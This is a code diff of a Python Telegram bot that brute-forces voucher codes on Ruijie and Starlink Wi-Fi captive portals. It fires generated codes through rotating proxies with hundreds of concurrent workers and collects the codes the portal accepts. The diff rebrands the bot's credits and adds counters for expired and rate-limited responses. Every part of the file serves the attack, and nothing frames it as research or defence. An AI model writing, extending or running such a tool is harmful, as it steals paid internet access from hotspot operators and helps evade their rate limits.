@@ -38,13 +38,14 @@ user_portals = {}
 user_proxies = {}
 proxy_indices = {}
 found_codes = {}
-scanner_stats = {}
 current_codes_tracker = {}
 tried_counters = {}
+expired_counters = {}
+limits_counters = {}
 
 def show_startup_banner():
     print("=" * 65)
-    print("  ⚡  RUIJIE ASYNC EXTREME SCANNER  ⚡")
+    print("  ⚡  RUIJIE & STARLINK EXTREME SCANNER  ⚡")
     print("=" * 65)
     print("Checking authorization...")
     print("[+] Access Granted!")
@@ -71,27 +72,27 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     current_proxy_display = f"{proxy_indices[chat_id] + 1}/{total_proxies}" if total_proxies > 0 else "0/0"
     
     keyboard = [
-        [InlineKeyboardButton("🌐 Update Portal 🔥 Kage", callback_data="update_portal")],
+        [InlineKeyboardButton("🌐 Update Portal 🔥 @SIRZIPP", callback_data="update_portal")],
         [InlineKeyboardButton("⚙️ Mode", callback_data="change_mode")],
         [InlineKeyboardButton(f"🔧 Workers: {user_workers[chat_id]}", callback_data="change_workers")],
         [InlineKeyboardButton(f"🔀 Proxies: {current_proxy_display}", callback_data="add_proxies")],
-        [InlineKeyboardButton("🚀 Start Scanner By Kage", callback_data="start_scanner")]
+        [InlineKeyboardButton("🚀 Start Scanner By @SIRZIPP", callback_data="start_scanner")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     text = (
-        "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
-        f"⚙️ Mode: `{user_modes[chat_id]}`\n"
-        f"🔧 Workers: `{user_workers[chat_id]}`\n"
-        f"📁 Proxy File: `https://t.me/Kage_starlink_channel`\n"
-        f"🔀 Proxies: `{current_proxy_display}`"
+        "⚡ Starlink & Ruijie Scanner Control Panel ⚡\n\n"
+        f"⚙️️ Mode: {user_modes[chat_id]}\n"
+        f"🔧 Workers: {user_workers[chat_id]}\n"
+        f"📁 Proxy File: Loaded from Proxy.txt\n"
+        f"🔀 Proxies: {current_proxy_display}"
     )
     
     if update.message:
-        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
+        await update.message.reply_text(text, reply_markup=reply_markup)
     elif update.callback_query:
         try:
-            await update.callback_query.message.edit_text(text, reply_markup=reply_markup, parse_mode="Markdown")
+            await update.callback_query.message.edit_text(text, reply_markup=reply_markup)
         except Exception:
             pass
 
@@ -103,7 +104,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "update_portal":
         await query.answer()
         context.user_data['waiting_for'] = 'portal'
-        await query.message.reply_text("🔗 Portal URL ကို ပို့ပေးပါ:")
+        await query.message.reply_text("🔗 Ruijie/Starlink Portal URL (wifidog link) ကို ပို့ပေးပါ:")
     
     elif data == "change_mode":
         await query.answer()
@@ -114,7 +115,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("🔙 Back", callback_data="mode_back")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.message.edit_text("⚙ **Choose Scanner Mode**", reply_markup=reply_markup, parse_mode="Markdown")
+        await query.message.edit_text("⚙ Choose Scanner Mode", reply_markup=reply_markup)
     
     elif data.startswith("mode_"):
         await query.answer()
@@ -133,7 +134,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("🔙 Back", callback_data="worker_back")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.message.edit_text("⚙️ **Choose Worker Count**", reply_markup=reply_markup, parse_mode="Markdown")
+        await query.message.edit_text("⚙️ Choose Worker Count", reply_markup=reply_markup)
         
     elif data.startswith("worker_"):
         await query.answer()
@@ -208,7 +209,6 @@ async def worker_task(worker_id, session, portal_url, chat_id):
         mode = user_modes.get(chat_id, "num6")
         code_val = generate_code_by_mode(mode)
         
-        # တိုက်ရိုက်ရေတွက်မှု တိုးမြှင့်ခြင်း
         tried_counters[chat_id] = tried_counters.get(chat_id, 0) + 1
         current_codes_tracker[chat_id] = code_val
         
@@ -223,16 +223,25 @@ async def worker_task(worker_id, session, portal_url, chat_id):
             
         try:
             target_url = f"{portal_url}&code={code_val}" if "?" in portal_url else f"{portal_url}?code={code_val}"
-            async with session.get(target_url, proxy=proxy, timeout=2.0) as response:
+            async with session.get(target_url, proxy=proxy, timeout=2.5) as response:
                 html_content = await response.text()
                 lower_html = html_content.lower()
+                
+                # Ruijie / Starlink အောင်မြင်မှု အညွှန်းကိန်း သော့ချက်စာလုံးများ
                 success_keywords = ["success", "welcome", "connected", "auth_pass", "login successfully", "internet", "minutes", "hours", "remaining"]
+                expired_keywords = ["expired", "invalid", "timeout", "used"]
+                limit_keywords = ["limit", "too many", "blocked", "restricted"]
                 
                 if response.status == 200 and any(kw in lower_html for kw in success_keywords) and "error" not in lower_html and "fail" not in lower_html:
                     if chat_id not in found_codes:
                         found_codes[chat_id] = []
                     if code_val not in found_codes[chat_id]:
                         found_codes[chat_id].append(code_val)
+                elif any(kw in lower_html for kw in expired_keywords):
+                    expired_counters[chat_id] = expired_counters.get(chat_id, 0) + 1
+                elif any(kw in lower_html for kw in limit_keywords):
+                    limits_counters[chat_id] = limits_counters.get(chat_id, 0) + 1
+                    
         except Exception:
             pass
         await asyncio.sleep(0.005)
@@ -242,6 +251,8 @@ async def run_scanner_with_workers(query, context, portal_url):
     scanning_states[chat_id] = True
     found_codes[chat_id] = []
     tried_counters[chat_id] = 0
+    expired_counters[chat_id] = 0
+    limits_counters[chat_id] = 0
     
     start_time = time.time()
     workers_count = user_workers.get(chat_id, 300)
@@ -250,14 +261,13 @@ async def run_scanner_with_workers(query, context, portal_url):
     stop_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Stop", callback_data="stop_scanner_btn")]])
     
     initial_text = (
-        "⚡ **Scanner Running** ⚡\n"
-        "Thank for using By Telegram https://t.me/Kage_starlink_channel\n\n"
+        "⚡ Scanner Running ⚡\n"
+        "Thank for using By Telegram @SIRZIPP\n\n"
         "⏳ စတင်နေပါပြီ..."
     )
     status_message = await query.message.reply_text(
         initial_text, 
-        reply_markup=stop_keyboard,
-        parse_mode="Markdown"
+        reply_markup=stop_keyboard
     )
     
     connector = aiohttp.TCPConnector(limit=workers_count, limit_per_host=workers_count)
@@ -272,6 +282,8 @@ async def run_scanner_with_workers(query, context, portal_url):
             
             elapsed = time.time() - start_time
             tried = tried_counters.get(chat_id, 0)
+            expired = expired_counters.get(chat_id, 0)
+            limits = limits_counters.get(chat_id, 0)
             speed = (tried / elapsed * 60) if elapsed > 0 else 0.0
             
             hits_list = found_codes.get(chat_id, [])
@@ -279,21 +291,22 @@ async def run_scanner_with_workers(query, context, portal_url):
             current_code = current_codes_tracker.get(chat_id, generate_code_by_mode(mode))
             
             live_text = (
-                "⚡ **Scanner Running** ⚡\n"
-                "Thank for using By Telegram https://t.me/Kage_starlink_channel\n\n"
+                "⚡ Scanner Running ⚡\n"
+                "Thank for using By Telegram @SIRZIPP\n\n"
                 f"🏹 Tried: {tried:,}\n"
-                f"🎯 Current Code: `{current_code}`\n"
-                f"🔥 Hits: {len(hits_list)} BY Kage\n"
-                f"❌ Expired: 0\n"
-                f"⚠️ Limits: 0\n"
-                f"⚡ Speed: {speed:,.1f} c/m\n"
+                f"🎯 Current Code: {current_code}\n"
+                f"🔥 Hits: {len(hits_list)} BY @SIRZIPP ဆရာဇ်\n"
+                f"❌ sirr Expired: {expired}\n"
+                f"⚠️ zipp Limits: {limits}\n"
+                f"⚡ ဆရာဇ် Speed: {speed:,.1f} c/m\n"
                 "___________________________________\n"
-                f"🔥 **Hit Codes BY Kage:**\n`{hits_str}`"
+                "🔥 Hit Codes BY Z I P P :\n"
+                f"{hits_str}"
             )
             try:
-                await status_message.edit_text(live_text, reply_markup=stop_keyboard, parse_mode="Markdown")
-            except Exception:
-                pass
+                await status_message.edit_text(live_text, reply_markup=stop_keyboard)
+            except Exception as e:
+                print(f"Edit text error: {e}")
             
         for task in tasks:
             task.cancel()
@@ -301,11 +314,11 @@ async def run_scanner_with_workers(query, context, portal_url):
     final_hits = found_codes.get(chat_id, [])
     final_text = "🛑 စကင်န်ဖတ်ခြင်း ရပ်တန့်သွားပါပြီ။\n\n"
     if final_hits:
-        final_text += f"🎉 **တွေ့ရှိခဲ့သော Ruijie Voucher Codes များ:**\n`" + "\n".join(final_hits) + "`"
+        final_text += "🔥 Hit Codes BY Z I P P :\n" + "\n".join(final_hits)
     else:
         final_text += "ℹ️ တွေ့ရှိသော Code အသစ် မရှိသေးပါ။"
         
-    await query.message.reply_text(final_text, parse_mode="Markdown")
+    await query.message.reply_text(final_text)
 
 async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
@@ -334,4 +347,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-    
